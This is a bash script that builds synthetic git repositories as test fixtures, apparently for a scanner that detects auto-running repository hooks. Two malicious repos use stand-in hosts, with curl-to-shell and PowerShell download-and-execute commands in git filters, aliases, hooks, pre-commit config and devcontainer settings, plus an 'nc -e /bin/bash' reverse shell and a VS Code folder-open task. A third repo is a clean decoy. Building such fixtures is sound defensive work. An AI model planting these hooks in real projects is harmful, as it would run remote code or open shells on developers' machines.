#!/bin/bash
# git-repo-hooks-route fixtures: builds synthetic repos with the real git CLI (git init / git config writes
# .git/config and .gitmodules), then dumps each tree to <out>/rh_<name>.tree = JSON {member: text} (stdlib json).
# Expected values come from rh_oracle.py (git config / git check-attr / PyYAML / json / shebang), never lib.codec.
set -euo pipefail
out=$(realpath "$1"); w=$(mktemp -d); export GIT_CONFIG_NOSYSTEM=1 HOME=$w
dump() { python3 -I -c 'import json,os,sys
r=sys.argv[1]; t={}
for d,ds,fs in os.walk(r):
    ds[:]=sorted(x for x in ds if x not in ("objects","refs","info","logs"))
    for f in sorted(fs):
        p=os.path.join(d,f); n=os.path.relpath(p,r)
        if n in (".git/HEAD",".git/description") or n.endswith(".sample") and n != ".git/hooks/pre-commit.sample": continue
        t[n]=open(p,encoding="utf-8").read()
json.dump(t,open(sys.argv[2],"w"),indent=1,sort_keys=True)' "$1" "$2"; }
# --- repo 1: git-native surfaces
r=$w/git; git init -q "$r"; cd "$r"
git config core.hooksPath .githooks
git config core.fsmonitor '.git/fsmon.sh'
git config filter.lfsx.smudge 'powershell -nop -w hidden -c "iwr https://cdn.example.invalid/s.ps1|iex"'
git config filter.lfsx.clean cat
git config diff.pic.textconv 'python3 tools/conv.py --in'
git config alias.st '!sh -c "curl -s https://a.example.invalid/k | sh"'
printf '*.dat filter=lfsx\n*.png diff=pic\n*.txt text eol=lf\n' > .gitattributes
mkdir -p .githooks tools
printf '#!/usr/bin/env python3\nimport os\nos.system("id > /tmp/.co")\n' > .git/hooks/post-checkout
printf '#!/bin/sh\ncurl -fsSL https://m.example.invalid/m.sh | sh\n' > .git/hooks/post-merge
printf '#!/bin/bash\nnc -e /bin/bash 203.0.113.9 4444 &\n' > .githooks/pre-push
git config -f .gitmodules submodule.lib.path vendor/lib
git config -f .gitmodules submodule.lib.url https://git.example.invalid/lib.git
git config -f .gitmodules submodule.lib.update '!sh -c "touch /tmp/.sub"'
dump "$r" "$out/rh_git_tree.tree"
# --- repo 2: tool-driven surfaces (husky / pre-commit / devcontainer / vscode)
r=$w/dev; git init -q "$r"; cd "$r"; mkdir -p .husky/_ .devcontainer .vscode
printf 'npx --no -- lint-staged\nnode scripts/beacon.js\n' > .husky/pre-commit
printf '#!/usr/bin/env sh\n# husky internals\n' > .husky/_/husky.sh
python3 -I -c 'import yaml,sys; yaml.safe_dump({"default_stages":["pre-commit"],"repos":[
 {"repo":"local","hooks":[{"id":"evil","name":"format","entry":"bash -c","args":["curl -s https://pc.example.invalid/x | bash"],"language":"system","stages":["pre-push"]}]},
 {"repo":"https://github.com/psf/black","rev":"24.1.0","hooks":[{"id":"black"}]}]},open(".pre-commit-config.yaml","w"),sort_keys=False)'
python3 -I -c 'import json; json.dump({"name":"dev","image":"mcr.microsoft.com/devcontainers/base:ubuntu",
 "postCreateCommand":"bash .devcontainer/setup.sh","postStartCommand":["pwsh","-c","Start-Job {iwr https://dc.example.invalid/p}"]},open(".devcontainer/devcontainer.json","w"),indent=2)'
python3 -I -c 'import json; json.dump({"version":"2.0.0","tasks":[{"label":"build","type":"shell","command":"make"},
 {"label":"init","type":"shell","command":"node","args":[".vscode/.cache/init.js"],"runOptions":{"runOn":"folderOpen"}}]},open(".vscode/tasks.json","w"),indent=2)'
dump "$r" "$out/rh_dev_tree.tree"
# --- decoy: only *.sample hooks, a plain attribute file, a devcontainer with no lifecycle command, no folderOpen task
r=$w/decoy; git init -q "$r"; cd "$r"; mkdir -p .git/hooks .devcontainer .vscode
printf '#!/bin/sh\nexit 0\n' > .git/hooks/pre-commit.sample
printf '*.txt text eol=lf\n*.png binary\n' > .gitattributes
printf '{"image": "mcr.microsoft.com/devcontainers/base:ubuntu", "features": {}}\n' > .devcontainer/devcontainer.json
printf '{"version": "2.0.0", "tasks": [{"label": "build", "type": "shell", "command": "make"}]}\n' > .vscode/tasks.json
printf '# readme\nRun `git config core.hooksPath .githooks` to enable hooks.\n' > README.md
dump "$r" "$out/rh_decoy_tree.tree"
rm -rf "$w"
